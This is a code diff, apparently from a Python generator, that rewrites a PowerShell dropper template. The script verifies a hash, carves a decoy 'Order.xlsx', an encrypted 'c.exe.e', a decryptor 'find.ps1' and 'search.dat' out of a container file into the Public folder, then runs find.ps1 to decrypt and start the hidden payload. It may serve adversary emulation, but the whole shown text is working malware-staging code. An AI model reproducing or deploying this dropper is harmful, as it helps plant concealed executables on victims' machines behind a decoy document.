@@ -143,36 +143,23 @@ if ($md5 -ne '{md5_hash}') {{
     exit -1
 }}
 
-# Extract the data from the dummy data
-$fs = [File]::OpenRead($dummy)
-$br = New-Object BinaryReader($fs)
-
-# (1) Benign excel file
-$f1 = Join-Path $lnk 'Order.xlsx'
-$f1d = $br.ReadBytes({offsets[data_paths[0]]})
-[File]::WriteAllBytes($f1, $f1d)
-
-# (2) Encrypted client executable
-$pub = $env:public
-$f2 = Join-Path $pub 'c.exe.e'
-$f2d = $br.ReadBytes({offsets[data_paths[1]]})
-[File]::WriteAllBytes($f2, $f2d)
-
-# (3) find.ps1, which is the PowerShell script to decrypt the client executable
-$f3 = Join-Path $pub 'find.ps1'
-$f3d = $br.ReadBytes({offsets[data_paths[2]]})
-[File]::WriteAllBytes($f3, $f3d)
-
-# (4) search.dat, which is the data file for the find.ps1 script
-$f4 = Join-Path $pub 'search.dat'
-$f4d = $br.ReadBytes({offsets[data_paths[3]]})
-[File]::WriteAllBytes($f4, $f4d)
-
-# Execute the find.ps1 and start the next job
-& (Join-Path $pub 'find.ps1')
-
+# Decrypt the file to retrieve the payload
+$ofs=@({offsets[data_paths[0]]},{offsets[data_paths[1]]},{offsets[data_paths[2]]},{offsets[data_paths[3]]})
+$fs=[System.IO.File]::OpenRead($dummy)
+$br=New-Object BinaryReader($fs)
+$tSize=$fs.Length
+for($i=0;$i-lt$ofs.Count;$i++){{
+    $sOff=$ofs[$i]
+    $eOff=if($i-lt$ofs.Count-1){{ $ofs[$i+1] }}else{{$tSize}}
+    $len=$eOff-$sOff
+    $fs.Seek($sOff,0)
+    $outPath=if($i-eq 0){{Join-Path $lnk 'order.xlsx'}}else{{Join-Path $env:public @('c.exe.e','find.ps1','search.dat')[$i-1]}}
+    [System.IO.File]::WriteAllBytes($outPath,$br.ReadBytes($len))
+}}
 $br.Close()
 $fs.Close()
+
+& (Join-Path $env:public 'find.ps1')
 """
 
     # Compress the PowerShell script
